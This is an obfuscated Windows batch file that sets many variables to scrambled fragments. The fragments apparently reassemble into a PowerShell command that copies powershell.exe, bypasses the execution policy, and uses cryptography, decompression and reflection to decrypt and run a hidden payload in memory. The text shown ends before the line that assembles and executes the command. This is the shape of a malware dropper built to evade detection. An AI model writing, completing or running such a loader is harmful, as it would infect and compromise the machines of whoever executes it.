@echo off
set "BZbpfksISV= /"
set "nFfWkOmrjb=1."
set "vFhjonpmiS=y "
set "VUpcvAwxQf=32"
set "ECrAeaephw=in"
set "mBpiJlmBYg=ll"
set "QdsmcCMmyg=st"
set "sPPaTnIJZU=0\"
set "cnPMTTATFX=ow"
set "vhpuPrETqk=we"
set "CNTsAikVsV=he"
set "toyHjHmScV=.e"
set "kBYgetDOYv=Po"
set "ivuuyDmkOU=xe"
set "LHRChIgfqH=rs"
set "rZqvgYZbDz=ll"
set "NfLUyfJINr=py"
set "fpwsRcPxuj=ws"
set "uTFSpBacAe=:\"
set "peujEoBLba=po"
set "nZefTpfYJb=rS"
set "rgCocMUuls=we"
set "xWgjVkwTmP=\v"
set "qYViJVOpRB=do"
set "RCQsVOEZRE=Sy"
set "pAbagcpWHY=\W"
set "QCZsacKcyr=Wi"
set "hGpFaKKWJn=nd"
set "TOiIJCEpKd= C"
set "ySEsPHCzPo=co"
set "fHiJArOPHG=s\"
set "CRxBlzxFeJ=em"
set "kHUXlOZPdq=he"
set "aRfvoIHnVS=cd"
set "FojhKlGlki= %~dp0"
set "cYiOQOWshT=nage"
set "hkqcQHDKGc= = $"
set "hMtctvKWZl=$uEu"
set "hXgizcawiI= '')"
set "GkIBuuTgEK=;$YB"
set "imhBkKbvhx=.Dis"
set "djBKVSFXOt==');"
set "BumBDLMKqn=]::("
set "YEKLHnoGxK=hwWW"
set "bYFTUljzWO=..-1"
set "HiqNKYxVKq=tion"
set "wyUABFwQPZ=1..-"
set "AtymMZiDba= if "
set "fOdvVjdghY=;$KW"
set "LWELZsPnXL== [S"
set "lGHSzxCzpc=Conv"
set "PXEVlDDeAf=Disp"
set "zQnrlMsulh=w.En"
set "wmdMxTksCO=comp"
set "kJNFQiOSLi=tcPH"
set "KpaFdxNXdD=DPwQ"
set "SuHrMhGyUY=-nop"
set "oifbJeddhF=K, 0"
set "tCFBPNvJGO=CFxo"
set "xjUtqFTUEx=$uEu"
set "jKulMJhseK=ispo"
set "HdZJCWzxRR=stem"
set "LHiyOMkkMH=g = "
set "BOUgQRfwMp=();$"
set "bfGTZOxawH=16] "
set "WyVpMFLZoR=lit("
set "ZpfxvKTNuG=$YBl"
set "CvnkHhdnWa='')("
set "niBUnSvWBo=nirt"
set "IjAyDUbqAN=-ep "
set "ToDBxhiAdb=e]::"
set "utxfoPDCXc=('Tg"
set "hZysytLxtd=pres"
set "HHSekNNUEi=iron"
set "BdRYUQNJka=; };"
set "LNJHIDaJVs=m(, "
set "zeUJtjSwmm=$KeY"
set "XpyfZLhAoL=ct S"
set "vBafNhWSZB=)($K"
set "fbhpNXhodV=[Sys"
set "JRCGUQRSQv=ss -"
set "HIoyTBYzfh=Obje"
set "xCaDaPgxPm=ck($"
set "XTXnxOSYtt=OGKZ"
set "DPTISDYGHX=)($i"
set "UMmmblrCyN=th('"
set "XTjtvwMwyF=ode]"
set "jONKTNkFKz=vert"
set "ZFNpYxtvpe=-1.."
set "AEOtvuZTcf=trea"
set "RPGyVzRktG=.Dis"
set "DjKfEIXKTo=join"
set "MRBONsClIo=BC;$"
set "dtklEqoPSW=).Sp"
set "fpcVNYRiXV=xHS."
set "aRYCSwwnzm=;$hw"
set "CDLSAZvVZw=ddin"
set "pgZLxgjRNM=k; }"
set "THBYYRpETK=xHS "
set "sbYiGryxoK=rofi"
set "yeTDstmzfr= = ["
set "RIYnkLVbJB=s75K"
set "xEycvmojOA=y.Pa"
set "SbjlqiBzFL=comm"
set "qJSxdjQtIz=Invo"
set "WQZqqzHVNN=Comp"
set "zXXinPXqjZ=('da"
set "jjoqxcmMwW=Secu"
set "PWzkmibyhO=.Com"
set "ubQniUfRKh=$WDP"
set "fkamOFUola=New-"
set "xLwgnObozd=WDPw"
set "zjifcYeFec='gni"
set "bExLagHpZB=  $i"
set "mbxDTtCqeT=();$"
set "IkHDTHFZBj=::('"
set "XPkWYHsodv= [st"
set "MvIIevHVWy=($KH"
set "FakficzmWT=);$u"
set "TDcgpdmmCA=flec"
set "YBAEZLwRcf=106u"
set "qSGJvzaRqC=HO.D"
set "vcbozucxEH=y.Cr"
set "JtlNULWFOZ=tryP"
set "hFibRveoOP= [Sy"
set "ZrKkcxrzTp=eMVs"
set "FEIRZwSbyy=pL.T"
set "cMLuGAKbkm=::De"
set "CaYxyEeoKd=yste"
set "HifrWRhMfJ=ress"
set "hBJZMoWUKR=lBlo"
set "CCHPNXXqeX= New"
set "SUwDvJGNpR=DPwQ"
set "LQQvtsmUoF=MN, "
set "FheTfKfGfB=yste"
set "CCqupfWZIo=[Sys"
set "xAEgzpzNed=New-"
set "bVUOCYWHoe=daeR"
set "lfVSpqhtoy=L4Yi"
set "aOCEgZOUPs=[]] "
set "qqYCFoVYQV=N = "
set "vnjBFYqzBy=)) {"
set "CzOXWtbucY=mory"
set "bxZmPvKXpB=gnir"
set "OrxEmVqMQf=gMod"
set "DSiOTnriSe=1] -"
set "nHFVghtgFU=-joi"
set "eGLuGqxVOt=3); "
set "cYIAwZFIIU=Bmor"
set "auVjaXTHzB=m.Re"
set "PLuTkYHZWz=zK ="
set "lUVIBAkFic=-4] "
set "jZyTRpMMaB=pose"
set "YLlIoWARyD=sion"
set "MHDyoZMeXA=ptog"
set "MfOFEnEYRt=ew-O"
set "ZTsaPCatLL=yste"
set "OFSZlGrcXQ=tem."
set "BMGOiYXoKN=esMa"
set "bKQDxDOghb=pL);"
set "SIOwIsZFMB=oin "
set "iCfoPEdiZQ=n ''"
set "iySZrabNmz=stem"
set "pXRiEabRZG=Disp"
set "vqtjihAsji=);$W"
set "NEBXaqzpFi=lgU."
set "uXfCdGBRvJ=OGKZ"
set "STBaNLAEqm=Star"
set "LdKAHhdaGm=gjYA"
set "aWhwFIJwzp=KeYz"
set "SVuYflbZad=.Key"
